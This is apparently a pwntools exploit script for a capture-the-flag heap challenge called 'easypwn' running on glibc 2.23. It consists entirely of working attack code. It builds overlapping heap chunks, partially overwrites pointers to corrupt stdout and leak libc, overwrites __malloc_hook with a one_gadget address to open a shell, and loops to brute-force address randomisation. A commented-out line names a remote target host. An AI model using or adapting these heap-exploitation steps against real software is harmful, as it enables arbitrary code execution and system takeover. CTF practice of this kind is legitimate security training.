from pwn import*

context.log_level = 'debug'
p = process('./easypwn')
#p = remote('39.101.184.181',10000)
elf = ELF('./easypwn')
libc = ELF('./libc-2.23.so')


def cmd(idx):
	p.sendlineafter("choice:\n",str(idx))

def cmd2(idx):
	p.sendafter("choice:",str(idx))

def add(size):
	cmd(1)
	p.sendlineafter("size:\n",str(size))

def edit(idx,payload):
	cmd(2)
	p.sendlineafter("idx:",str(idx))
	p.sendafter("content:\n",payload)

def free(idx):
	cmd(3)
	p.sendlineafter("idx:\n",str(idx))

def pwn():
	add(0xf8) #0
	add(0x68) #1
	add(0xf8) #2
	add(0xf8) #3
	add(0x88) #4
	add(0xf8) #5
	add(0x68) #6
	add(0x68) #7
	add(0x68) #8

	free(0)
	edit(1,"a"*0x60+p64(0x70+0x100))
	free(2)
	add(0xf8) #0
	add(0x68) #2-->1
	add(0xf8) #9

	free(3)
	edit(4,"a"*0x80+p64(0x90+0x100))
	free(5)
	add(0xf8)
	add(0x88) #5-->4
	add(0xf8) #10

	free(7)
	add(0x68) #7
	free(4)
	edit(5,p64(0)+p16(0x37f8-0x10-0x5)+'\n')
	add(0x88) #4

	free(6)
	free(1)
	edit(2,p8(0x70)+'\n')
	edit(7,p16(0x25dd)+'\n')

	add(0x68) #1
	add(0x68) #6
	add(0x68) #11

	p.sendafter("choice:","2")
	p.sendlineafter("idx:","11")
	p.sendlineafter("content:","\x00"*0x33+p64(0xfbad1887)+p64(0)*3+p8(0))
	libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))-0x3c5600
	print "libc_base = "+hex(libc_base)
	malloc_hook = libc_base + libc.sym["__malloc_hook"]
	og = [0x45226,0x4527a,0xf0364,0xf1207]
	one = libc_base + og[2]

	free(6)
	free(1)
	cmd2(2)
	p.sendlineafter("idx:",str(2))
	p.sendlineafter("content:",p64(malloc_hook-0x23))
	add(0x68)
	add(0x68)

	cmd2(2)
	p.sendlineafter("idx:",str(6))
	p.sendlineafter("content:","a"*0x13+p64(one))
	add(0x100)

	p.interactive()

if __name__ == "__main__":
    while True:
        #p = remote('39.101.184.181',10000)
	elf = ELF('./easypwn')
	libc = ELF('./libc-2.23.so')
        try:
            pwn()
        except:
            p.close() 
